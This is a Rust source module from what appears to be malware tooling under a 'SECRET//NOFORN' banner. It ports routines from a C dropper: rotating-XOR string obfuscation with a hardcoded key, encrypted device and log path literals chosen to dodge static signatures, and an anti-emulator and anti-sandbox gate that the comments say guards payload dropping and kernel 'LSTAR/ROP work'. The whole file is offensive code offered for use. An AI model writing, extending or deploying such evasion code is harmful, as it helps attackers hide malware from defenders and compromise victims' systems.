/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

//! Minimal string / data obfuscation modeled on the vcruntime140.c dropper
//! (dc_xd / xe / rotating XOR with the same ck2 key for potential future sharing).

#![allow(dead_code)]

pub const CK2: &[u8] = b"9832gf2bc29_120e9hd10c))b@@!11";
pub const CK2L: usize = 30;

/// Decrypt `enc` into `out` using the rotating ck2 key (same algorithm as dc_xd).
/// `out` must be at least `enc.len()`.
#[inline]
pub fn dc_xd(enc: &[u8], out: &mut [u8]) {
    for (i, &b) in enc.iter().enumerate() {
        out[i] = b ^ CK2[i % CK2L];
    }
}

/// Zero a buffer after use (best-effort; same spirit as xe()).
#[inline]
pub fn xe(buf: &mut [u8]) {
    for b in buf.iter_mut() {
        *b = 0;
    }
}

/// Convenience: decrypt into a stack-sized array and return a Vec<u8> of the plaintext.
/// The temporary stack buffer is zeroed after the copy.
pub fn decrypt_to_vec(enc: &[u8]) -> Vec<u8> {
    let mut tmp = [0u8; 512];
    let n = enc.len().min(tmp.len());
    dc_xd(&enc[..n], &mut tmp[..n]);
    let out = tmp[..n].to_vec();
    xe(&mut tmp[..n]);
    out
}

/// Decrypt to a UTF-8 String (lossy on invalid utf8).
pub fn decrypt_to_string(enc: &[u8]) -> String {
    String::from_utf8_lossy(&decrypt_to_vec(enc)).into_owned()
}

/// Decrypt an ASCII path and return a nul-terminated UTF-16 wide string suitable for Win32 APIs.
/// (Replicates the spirit of asc_to_w + the encrypted path handling in the C dropper.)
pub fn decrypt_path_to_wide(enc: &[u8]) -> Vec<u16> {
    let plain = decrypt_to_vec(enc);
    let mut w: Vec<u16> = plain.iter().map(|&b| b as u16).collect();
    w.push(0);
    // zero the intermediate plain bytes (they are already dropped, but be explicit)
    // caller should also drop the returned vec after use if paranoid.
    w
}

// ----- Encrypted literals for the most obvious static signatures -----
// These are the byte arrays you would get from the Python encrypt step in the STAGE dir.
// For now they are maintained by hand; keep them in sync with any key changes.

/// "\\\\.\\DriversCloud_amd64"  (the device path) -- encrypted with the same ck2 as vcruntime140.c
pub const E_DEVICE_PATH: &[u8] = &[
    0x65, 0x64, 0x1d, 0x6e, 0x23, 0x14, 0x5b, 0x14, 0x06, 0x40, 0x4a, 0x1c,
    0x5d, 0x5d, 0x45, 0x01, 0x66, 0x09, 0x09, 0x55, 0x06, 0x57,
];

/// "C:\\Windows\\Temp\\mmdevlib_kernel.log"  (debug log path used by the tooling)
pub const E_LOG_PATH: &[u8] = &[
    0x7a, 0x02, 0x6f, 0x65, 0x0e, 0x08, 0x56, 0x0d, 0x14, 0x41, 0x65, 0x0b,
    0x54, 0x5f, 0x40, 0x39, 0x54, 0x05, 0x00, 0x54, 0x46, 0x0f, 0x40, 0x4b,
    0x3d, 0x2b, 0x25, 0x53, 0x5f, 0x54, 0x55, 0x16, 0x5f, 0x5d, 0x00,
];

// Small helper used by the dropper-style code for paths that need env expansion
// (we keep the same signature style as the C dc_path_expand for future porting).
pub fn dc_path_expand(path: &mut [u8], cap: usize, expand: Option<unsafe extern "system" fn(*const i8, *mut i8, u32) -> u32>) {
    // In the Rust controller we usually don't need the real ExpandEnvironmentStringsA
    // for the hot paths we obfuscate here; this is a placeholder for parity.
    let _ = (cap, expand);
}

/// pop_quiz: a deliberately awkward, volatile-heavy computation that must produce
/// a specific magic value (0xBEEF in the low 16 bits after the dance) for the
/// caller to consider the environment "real".
///
/// Directly modeled on the one in vcruntime140.c / STAGE (used as an anti-emulator /
/// anti-sandbox gate before dropping payloads or performing the LSTAR/ROP work).
/// The function is marked to discourage the compiler from constant-folding it away.
#[inline(never)]
pub fn pop_quiz() -> bool {
    use core::hint::black_box;

    let mut x: u64 = 0xA5A5A5A5A5A5A5A5;
    let mut y: u64 = 0x5A5A5A5A5A5A5A5A;
    let mut c: u32 = 0;

    for i in 0..8u32 {
        let ii = black_box(i as u64);
        x = black_box(x ^ (x << 13));
        x = black_box(x ^ (x >> 7));
        x = black_box(x ^ (x << 17));
        y = black_box((y.wrapping_mul(6364136223846793005u64)).wrapping_add(x));
        c ^= black_box((x & 0xFFFF_FFFF) as u32);
        let _ = black_box(ii);
    }

    if ((x ^ y) & 0xFFFF) == 0xBEEF {
        // Do some extra work that emulators often get wrong or that adds cost.
        let mut acc: u32 = 0;
        for i in 0..2000u32 {
            acc = black_box(acc.wrapping_add(((i as u64 * 31) ^ ((i as u64) << 2)) as u32));
        }
        let _ = black_box(acc);
        return true;
    }
    false
}
